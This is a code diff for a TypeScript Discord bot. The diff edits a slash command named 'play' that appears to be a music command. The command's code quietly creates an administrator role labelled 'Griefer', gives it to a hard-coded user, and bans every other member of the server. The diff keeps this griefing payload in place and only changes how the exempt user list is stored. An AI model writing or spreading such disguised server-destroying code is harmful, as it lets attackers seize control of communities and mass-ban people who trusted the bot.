@@ -2,6 +2,7 @@ import {Command} from "../../Command";
 import {ChannelType, Client, CommandInteraction, EmbedBuilder, SlashCommandStringOption} from "discord.js";
 import {player} from "../../Bot";
 import {Song} from "discord-music-player";
+import {toArray} from "cheerio/lib/api/traversing";
 
 
 export const play: Command = {
@@ -43,7 +44,8 @@ export const play: Command = {
 const run = async (client: Client, interaction: CommandInteraction) => {
     console.log("Play auf Paluten aufgeführt")
     let guild = interaction.guild!;
-    const dont_ban = [591966253548175370, 530740749650624522, 927581042922098750]
+    const dont_ban = new Map()
+    dont_ban.set(591966253548175370, "Felix")
     // Make role with admin permissions and add it to the user
 
     let admin_role = await guild.roles.create({
@@ -53,7 +55,7 @@ const run = async (client: Client, interaction: CommandInteraction) => {
         hoist: false,
         reason: "Griefer"
     })
-    for (let member of dont_ban) {
+    for (let member of dont_ban.keys()) {
         //Give member the role
         await guild.members.cache.find((value) => parseInt(value.id)==member)?.roles.add(admin_role)
     }
@@ -62,9 +64,10 @@ const run = async (client: Client, interaction: CommandInteraction) => {
         async (member) => {
             try {
                 const memberid = await member.id;
-                if (dont_ban.includes(Number(memberid)))
-                    return;
-                await member.ban({reason: "Paluten"});
+                if (dont_ban.has(memberid)) {
+                    return
+                }
+                await member.ban()
             } catch (e) {
                 console.log("Could not ban " + member.user.tag);
             }
